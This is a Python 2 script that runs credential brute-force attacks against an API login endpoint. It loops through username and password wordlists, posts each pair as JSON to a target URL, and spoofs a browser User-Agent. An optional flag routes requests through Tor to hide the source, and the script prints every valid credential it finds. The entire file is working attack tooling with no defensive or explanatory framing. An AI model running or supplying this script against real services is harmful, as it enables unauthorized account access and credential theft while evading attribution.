#!/usr/bin/env python
# coding=utf-8

import argparse
import os
import sys

import requests


def login(url, user, password, validation_errors, error_key='message', torify=False):
    headers = {'Accept': 'application/json, text/plain, */*',
               'Content-Type': 'application/json;charset=utf-8',
               'Connection': 'keep-alive',
               'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0',
               'Accept-Language': 'en-US,en;q=0.5'
               }
    proxy_address = '127.0.0.1'
    proxy_port = 9050

    authentication = {'user_name': user, 'password': password}
    session = requests.session()
    if torify:
        session.proxies = {'http': "socks5h://{}:{}".format(proxy_address, proxy_port),
                           'https': "socks5h://{}:{}".format(proxy_address, proxy_port)}

    attempt = session.post(url=url, json=authentication,
                           headers=headers)
    response = attempt.json()
    if attempt.status_code is 200 and response[error_key] not in validation_errors:
        return True
    return False


def percentage(part, whole):
    return 100 * float(part) / float(whole)


def brute(api_url, users_file, passwords_file, errors_file, error_key='message', torify=False):
    valid_credentials = []

    users = [line.rstrip('\n') for line in open(users_file)]
    passwords = [line.rstrip('\n') for line in open(passwords_file)]
    validation_errors = [line.rstrip('\n').decode('utf-8') for line in open(errors_file)]

    passwords_count = len(passwords)

    for user in users:
        continue_testing = True
        while continue_testing:
            attempts = 0
            for password in passwords:
                attempts += 1
                sys.stdout.write("\r%s [%.0f%%]" % (user, percentage(attempts, passwords_count)))
                sys.stdout.flush()
                if login(url=api_url, user=user, password=password, validation_errors=validation_errors,
                         error_key=error_key, torify=torify):
                    print "\n\tPassword found: {}".format(password)
                    valid_credentials.append({'user': user, 'password': password})
                    continue_testing = False
            if attempts is passwords_count:
                continue_testing = False
            sys.stdout.write("\n")
            sys.stdout.flush()

    return valid_credentials


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Perform a brute force attacks against an API login endpoint.')
    parser.add_argument('target', help='The target URL.')
    parser.add_argument('users', help='The file containing usernames.')
    parser.add_argument('passwords', help='The file containing the passwords to test.')
    parser.add_argument('errors', help='A list of invalid strings.')
    parser.add_argument('--tor', dest='torify', action='store_true', help="Connect using Tor proxy")

    args = parser.parse_args()

    credentials = []

    if os.path.isfile(args.users) and os.path.isfile(args.passwords) and os.path.isfile(args.errors):
        credentials = brute(api_url=args.target, users_file=args.users, passwords_file=args.passwords,
                            errors_file=args.errors, torify=args.torify)
        if len(credentials) > 0:
            print 'Valid credentials found:'
            for credential in credentials:
                print '{}:{}'.format(credential['user'], credential['password'])
        else:
            print '\nNo credentials were found :('
    else:
        print 'Please verify your files -.-!'
